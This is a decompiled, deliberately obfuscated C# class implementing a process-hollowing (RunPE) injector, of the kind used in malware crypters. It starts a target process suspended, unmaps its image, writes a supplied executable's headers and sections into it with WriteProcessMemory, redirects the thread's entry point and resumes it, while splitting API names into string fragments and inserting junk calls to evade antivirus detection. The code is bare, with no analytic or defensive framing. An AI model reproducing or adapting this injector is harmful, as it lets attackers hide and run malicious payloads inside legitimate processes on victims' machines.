using System;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns6;

internal class Class33
{
	internal delegate bool Delegate3(IntPtr wwwwwwwwwwwwwwwwwwwwwfe, ref Struct22 dggggggggggggggggggggggggggggggggf);

	internal delegate uint Delegate4(IntPtr threDSADSAad);

	internal delegate long Delegate5(IntPtr proce3SADASss, int addrSADASDess);

	internal delegate bool Delegate6(IntPtr threDDSA3ad, ref Struct22 conDSA3SADtext);

	internal delegate bool Delegate7(IntPtr proSDA3Acess, int addreSDSA3ss, byte[] bufDSA3ASfer, int sizSA3ASDASe, out int wriS3A3S3tten);

	internal delegate IntPtr Delegate8(IntPtr proceSA3ASDASss, int addreSA3AAEss, uint siDSA3ze, uint tyDSA3AS3pe, uint proS3A3SAtect);

	internal delegate int Delegate9(IntPtr SA3AAAAAAA, int adSDA3ASdress, ref int buffeDAS3A3r, int si3ASzeSSA, ref int reaSA3ASd);

	internal struct Struct22
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public Struct23 struct23_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	internal struct Struct23
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	internal struct Struct24
	{
		public uint uint_0;

		public uint uint_1;
	}

	internal struct Struct25
	{
		public byte byte_0;

		public Struct24 struct24_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;
	}

	internal struct Struct26
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct Struct27
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public short short_0;

		public short short_1;

		public int int_9;

		public int int_10;

		public int int_11;

		public int int_12;
	}

	internal struct Struct28
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	internal struct Struct29
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	internal struct Struct30
	{
		public uint uint_0;

		public Struct31 struct31_0;

		public Struct32 struct32_0;
	}

	internal struct Struct31
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	internal struct Struct32
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Struct33[] struct33_0;
	}

	internal struct Struct33
	{
		public uint uint_0;

		public uint uint_1;
	}

	private static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ghsssssssssSFFFFFFFFFFF);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr GSEEEEEEEEEEEEEE, [MarshalAs(UnmanagedType.VBByRefStr)] ref string GGGGGGGGGGESSSSSSSSSSGSD);

	public static void smethod_1(byte[] byte_0, string string_0)
	{
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		Struct22 conDSA3SADtext = default(Struct22);
		Struct26 info = default(Struct26);
		Struct27 startup = default(Struct27);
		Struct28 process = default(Struct28);
		Struct28 thread = default(Struct28);
		Struct29 @struct = default(Struct29);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), @struct.GetType());
		Struct29 struct2 = default(Struct29);
		@struct = ((obj != null) ? ((Struct29)obj) : struct2);
		Struct30 struct3 = default(Struct30);
		string name = null;
		string current = null;
		IntPtr system = default(IntPtr);
		if (0 - (CreateProcess(ref name, ref string_0, ref process, ref thread, inherit: false, 4u, system, ref current, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		gCHandle.Free();
		checked
		{
			IntPtr ptr = new IntPtr(num + @struct.int_0);
			object? obj2 = Marshal.PtrToStructure(ptr, struct3.GetType());
			Struct30 struct4 = default(Struct30);
			struct3 = ((obj2 != null) ? ((Struct30)obj2) : struct4);
			startup.int_0 = Strings.Len((object)startup);
			conDSA3SADtext.uint_0 = 65538u;
			string text = "ke";
			Conversion.Int((object)false);
			string string_ = "GetThreadContext";
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			string string_2 = "ZwUnmapViewOfSection";
			Conversion.Int((object)false);
			string text2 = "ext";
			string text3 = "tualAll";
			string text4 = "SetThr";
			Conversion.Int((object)false);
			string text5 = "ocEx";
			string string_3 = "ReadProcessMemory";
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			string text6 = "Vir";
			string string_4 = "ResumeThread";
			string text7 = "rnel32";
			Conversion.Int((object)false);
			string text8 = "eadCont";
			Conversion.Int((object)false);
			string text9 = "Wr";
			Delegate6 @delegate = smethod_0<Delegate6>(text + text7, string_);
			Delegate5 delegate2 = smethod_0<Delegate5>("ntdll", string_2);
			string text10 = "iteProcessMemory";
			Delegate3 delegate3 = smethod_0<Delegate3>(text + text7, text4 + text8 + text2);
			Delegate8 delegate4 = smethod_0<Delegate8>(text + text7, text6 + text3 + text5);
			Delegate7 delegate5 = smethod_0<Delegate7>(text + text7, text9 + text10);
			uint num2 = (uint)(int)delegate4(info.intptr_0, (int)struct3.struct32_0.uint_6, struct3.struct32_0.uint_10, 12288u, 4u);
			Delegate4 delegate6 = smethod_0<Delegate4>(text + text7, string_4);
			Delegate9 delegate7 = smethod_0<Delegate9>(text + text7, string_3);
			byte[] bytes = BitConverter.GetBytes(num2);
			if (unchecked((long)struct3.uint_0) != 17744L || @struct.ushort_0 != 23117)
			{
				return;
			}
			bool num3 = @delegate(info.intptr_1, ref conDSA3SADtext);
			IntPtr intptr_ = info.intptr_0;
			int adSDA3ASdress = (int)(unchecked((long)conDSA3SADtext.uint_13) + 8L);
			int buffeDAS3A3r = 239293923;
			int reaSA3ASd = 0;
			if (!(num3 & (delegate7(intptr_, adSDA3ASdress, ref buffeDAS3A3r, 4, ref reaSA3ASd) >= 0) & (delegate2(info.intptr_0, 239293923) >= 0L)) || unchecked((long)num2) == 0L)
			{
				return;
			}
			IntPtr intptr_2 = info.intptr_0;
			int addreSDSA3ss = (int)num2;
			int sizSA3ASDASe = (int)struct3.struct32_0.uint_11;
			uint num4 = default(uint);
			int wriS3A3S3tten = (int)num4;
			delegate5(intptr_2, addreSDSA3ss, byte_0, sizSA3ASDASe, out wriS3A3S3tten);
			num4 = (uint)wriS3A3S3tten;
			long num5 = @struct.int_0 + 248;
			int num6 = unchecked((int)struct3.struct31_0.ushort_1) - 1;
			Struct25 struct5 = default(Struct25);
			Struct25 struct6 = default(Struct25);
			for (int i = 0; i <= num6; i++)
			{
				string text11 = "23232323a";
				Conversion.Int((object)false);
				ptr = new IntPtr(num + num5 + i * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, struct5.GetType());
				struct5 = ((obj3 != null) ? ((Struct25)obj3) : struct6);
				Conversion.Int((object)false);
				string text12 = "23232323a";
				byte[] array = new byte[(int)struct5.uint_1 + 1];
				int num7 = (int)(unchecked((long)struct5.uint_1) - 1L);
				for (int j = 0; j <= num7; j++)
				{
					array[j] = byte_0[(int)(unchecked((long)struct5.uint_2) + unchecked((long)j))];
				}
				IntPtr intptr_3 = info.intptr_0;
				int addreSDSA3ss2 = (int)(num2 + struct5.uint_0);
				int sizSA3ASDASe2 = (int)struct5.uint_1;
				wriS3A3S3tten = (int)num4;
				delegate5(intptr_3, addreSDSA3ss2, array, sizSA3ASDASe2, out wriS3A3S3tten);
				num4 = (uint)wriS3A3S3tten;
				delegate4(info.intptr_0, (int)(num2 + struct5.uint_0), struct5.struct24_0.uint_1, (uint)smethod_4(struct5.uint_7), 239293923u);
				string text13 = "sddddddddddddd";
			}
			IntPtr intptr_4 = info.intptr_0;
			int addreSDSA3ss3 = (int)(unchecked((long)conDSA3SADtext.uint_13) + 8L);
			wriS3A3S3tten = (int)num4;
			delegate5(intptr_4, addreSDSA3ss3, bytes, 4, out wriS3A3S3tten);
			num4 = (uint)wriS3A3S3tten;
			conDSA3SADtext.uint_16 = num2 + struct3.struct32_0.uint_3;
			string text14 = "sddddasdasddddddd";
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			int num8 = 323;
			Conversion.Int((object)false);
			string text15 = "sddddasdasd11dddddd";
			delegate3(info.intptr_1, ref conDSA3SADtext);
			delegate6(info.intptr_1);
		}
	}

	private static long smethod_2(long long_0, long long_1)
	{
		return checked((long)Math.Round(smethod_3(long_0) / Math.Pow(2.0, long_1)));
	}

	private static double smethod_3(long long_0)
	{
		if (long_0 < 0L)
		{
			return (double)long_0 + 4294967296.0;
		}
		return long_0;
	}

	private static long smethod_4(long long_0)
	{
		object[] array = new object[8] { 69419572L, 69419572L, 591541283u, 69419572L, 3293748L, 407092L, 3293748L, 407092L };
		return Conversions.ToLong(array[checked((int)smethod_2(long_0, 29L))]);
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CreateProcess([MarshalAs(UnmanagedType.VBByRefStr)] ref string name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string command, ref Struct28 process, ref Struct28 thread, bool inherit, uint flags, IntPtr system, [MarshalAs(UnmanagedType.VBByRefStr)] ref string current, [In] ref Struct27 startup, out Struct26 info);
}
